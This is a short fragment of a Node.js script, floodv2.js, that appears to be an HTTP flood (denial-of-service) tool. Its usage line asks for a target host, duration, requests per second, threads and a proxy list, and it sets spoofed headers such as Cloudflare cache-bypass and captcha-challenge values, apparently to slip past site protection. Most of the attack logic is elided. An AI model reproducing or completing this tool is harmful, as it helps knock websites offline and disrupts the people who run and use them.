const net = require("net");
 ...
 if (process.argv.length < 7){console.log(gradient.vice(`[!] node floodv2.js <HOST> <TIME> <RPS> <THREADS> <PROXY>.`));}
 const headers = {};
...
headers["alt-svc"] = 'h2=":443"; ma=500';
headers["cf-cache-status"] = "BYPASS";
headers["X-Rate-Limit"] = "true";
headers["CF-Captcha-Challenge"] = "1";
